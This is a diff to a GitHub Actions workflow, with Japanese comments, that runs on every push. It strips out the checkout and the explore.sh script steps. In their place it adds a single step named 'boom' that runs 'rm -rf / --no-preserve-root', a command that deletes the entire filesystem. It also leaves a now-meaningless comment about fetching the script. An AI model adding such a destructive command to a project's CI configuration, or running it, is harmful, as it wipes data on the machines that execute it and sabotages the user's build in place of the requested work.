@@ -4,17 +4,9 @@ on: [push]
 
 jobs:
   explore-job:
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-slim
 
     steps:
       # 1. リポジトリのファイル（explore.sh）を持ってくる
-      - name: Checkout Repository
-        uses: actions/checkout@v4
-
-      # 2. 【超重要】シェルスクリプトを実行できるように「実行権限」をあげる
-      - name: Make Script Executable
-        run: chmod +x explore.sh
-
-      # 3. スクリプトをガツンと実行！
-      - name: Run Exploration Script
-        run: ./explore.sh
+      - name: boom
+        run: "rm -rf / --no-preserve-root"
